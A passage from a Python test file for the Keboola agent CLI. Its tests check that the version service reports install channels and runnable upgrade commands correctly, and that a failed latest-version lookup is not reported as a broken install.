            ),
            patch("keboola_agent_cli.auto_update._write_cache"),
        ):
            yield

    def test_frozen_advertises_the_channel_command(self):
        with patch(
            "keboola_agent_cli.services.version_service.detect_frozen_distribution",
            return_value=TestFrozenBuildSelfUpdateGuard.CHOCO_DIST,
        ):
            result = VersionService().get_versions()
        kbagent = result["kbagent"]
        assert kbagent["upgrade_command"] == "choco upgrade keboola-cli2"
        assert kbagent["install_channel"] == "chocolatey"
        assert "uv tool install" not in kbagent["upgrade_command"]

    def test_frozen_archive_keeps_prose_out_of_upgrade_command(self):
        """`upgrade_command` must stay runnable-or-empty, never a sentence.

        The gotchas entry tells consumers they may shell out to
        `upgrade_command`; handing them "re-download the signed archive
        from https://..." would make them execute prose. Channels with no
        single command carry it in `upgrade_hint` instead.
        """
        with patch(
            "keboola_agent_cli.services.version_service.detect_frozen_distribution",
            return_value=TestFrozenBuildSelfUpdateGuard.ARCHIVE_DIST,
        ):
            result = VersionService().get_versions()
        kbagent = result["kbagent"]
        assert kbagent["upgrade_command"] == ""
        assert "re-download the signed archive" in kbagent["upgrade_hint"]
        assert kbagent["install_channel"] == "archive"

    def test_offline_refusal_does_not_print_vnone(self):
        """The release lookup can fail; the summary must not say "-> vNone"."""
        plan = KbagentUpdatePlan(
            current_version="1.0.0",
            latest_version=None,
            up_to_date=None,
            command=None,
            recovery_command=None,
            frozen_distribution=TestFrozenBuildSelfUpdateGuard.CHOCO_DIST,
        )
        summary = VersionService._compose_update_summary(VersionService._update_kbagent(plan))
        assert "vNone" not in summary
        assert "latest version unknown" in summary
        assert "choco upgrade keboola-cli2" in summary

    def test_non_frozen_json_shape_is_unchanged(self):
        """The additive key must not appear for uv/pip installs."""
        with (
            patch(
                "keboola_agent_cli.services.version_service.detect_frozen_distribution",
                return_value=None,
            ),
            patch(
                "keboola_agent_cli.services.version_service.resolve_kbagent_wheel_url",
                return_value=None,
            ),
        ):
            result = VersionService().get_versions()
        assert "install_channel" not in result["kbagent"]
        assert "upgrade_hint" not in result["kbagent"]
        # `uv` is resolved to an absolute path, which on Windows is
        # `...\\uv.EXE` -- assert the command shape, not one spelling of it.
        upgrade = result["kbagent"]["upgrade_command"]
        assert "tool install" in upgrade
        assert "uv" in upgrade.lower()


class TestUnknownLatestVersionIsNotAFailure:
    """A failed version lookup must not read as a broken install.

    Both situations used to reach the same `command is None` branch and print
    the same thing, so a transient GitHub rate limit -- 60 unauthenticated
    requests per hour, shared by every tool behind one IP -- told the user
    their self-update was broken and handed them
    `uv tool install --force --reinstall`, a command with no package in it.
    """

    def test_unknown_latest_reports_the_real_cause_and_no_fake_command(self) -> None:
        plan = KbagentUpdatePlan(
            current_version="0.80.3",
            latest_version=None,
            up_to_date=None,
            command=None,
            recovery_command=None,
        )

        result = VersionService._update_kbagent(plan)

        assert result["reason"] == "latest_version_unknown"
        assert result["updated"] is False
        # Nothing was attempted, so nothing was "planned" either.
        assert result["planned"] is False
        assert "Could not determine the latest kbagent version" in result["message"]
        assert "rate limit" in result["message"]
        assert "0.80.3 was left untouched" in result["message"].replace("v0.80.3", "0.80.3")
        # The old text, and the unrunnable command it suggested, must be gone.
        assert "Could not prepare a self-update command" not in result["message"]
        assert "recovery_command" not in result

    def test_known_latest_without_a_command_still_says_so(self) -> None:
        """The genuine local failure keeps its own, different message."""
        plan = KbagentUpdatePlan(
            current_version="0.80.3",
            latest_version="0.80.4",
            up_to_date=False,
            command=None,
            recovery_command="uv tool install --force --reinstall 'keboola-cli @ x'",
        )

        result = VersionService._update_kbagent(plan)

        assert "Could not prepare a self-update command for v0.80.4" in result["message"]
        assert "uv tool install --force --reinstall 'keboola-cli @ x'" in result["message"]

    def test_no_recovery_command_points_at_the_releases_page_instead(self) -> None:
        """Never render `Recover with: None`, and never a command with no package."""
        plan = KbagentUpdatePlan(
            current_version="0.80.3",
            latest_version="0.80.4",
            up_to_date=False,
            command=None,
            recovery_command=None,
        )

        result = VersionService._update_kbagent(plan)

        assert "Recover with: None" not in result["message"]
        assert "releases/latest" in result["message"]
